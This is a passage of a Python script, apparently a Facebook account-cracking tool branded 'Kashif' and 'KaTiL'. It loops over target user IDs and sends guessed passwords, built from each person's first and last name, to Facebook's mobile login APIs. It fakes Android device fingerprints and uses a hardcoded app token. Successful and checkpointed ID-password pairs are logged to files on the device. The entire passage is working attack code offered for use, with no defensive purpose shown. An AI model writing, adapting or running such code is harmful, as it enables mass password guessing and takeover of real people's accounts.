                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3040};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.75,width=720,height=2329};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X625D;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',
                                'error_detail_type':'button_with_disabled',
                                'enroll_misauth':'false',
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        headers={
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':ua,
                                'Accept-Encoding':'gzip',
                                'Content-Typ': 'application/json; charset=UTF-8',
                                'WWW-Authenticate': 'OAuth "Facebook Platform" "invalid_request" "Invalid username or password"',
                                'Content-Disposition': 'attachment; filename="173EA25D1676138501.jpg"',
                                'X-Frame-Options': 'DENY',
                                'facebook-api-version': 'v1.0',
                                'Strict-Transport-Security': 'max-age=15552000; preload',
                                'Pragma': 'no-cache',
                                'Cache-Control': 'no-store',
                                'Expires': 'Sat, 01 Jan 2000 00:00:00 GMT',
                                'x-fb-request-id': 'AXPPxZzS0yvpC9W5faJl4HM',
                                'x-fb-trace-id': 'AcUDL45vKRb',
                                'x-fb-rev': '1006949215',
                                'X-FB-Debug': 'fEI80mXjMSc6LJdFgDl2XDxUqeaCfdI5Z/R307rjT19pTEY928W8GP1aHho5powRkMbGUaU258QKFKio/Ut9dw==',
                                'Date': 'Sat, 11 Feb 2023 18:01:41 GMT',
                                'X-FB-Client-IP-Forwarded': '182.185.59.235',
                                'X-FB-Server-Cluster-Forwarded': 'mxp1c01',
                                'X-FB-Connection-Quality': 'MODERATE; q=0.3, rtt=645, rtx=2, c=7, mss=1380, tbw=4551, tp=-1, tpl=-1, uplat=1718, ullat=761',
                                'Connection': 'keep-alive',
                                'Content-Length': '237',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m[Kashif-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KaTiL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                      #  print('\r\r\033[1;31m[Kashif-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/[Kashif-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[Kashif-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m[Kashif-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KaTiL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                             #   print('\r\r\x1b[1;96m[KaTiL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Kashif-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/Kashif-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m[Kashif-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Kashif-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m[Kashif-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/KaTiL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m[Kashif-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KaTiL-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
                        
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass
menu()
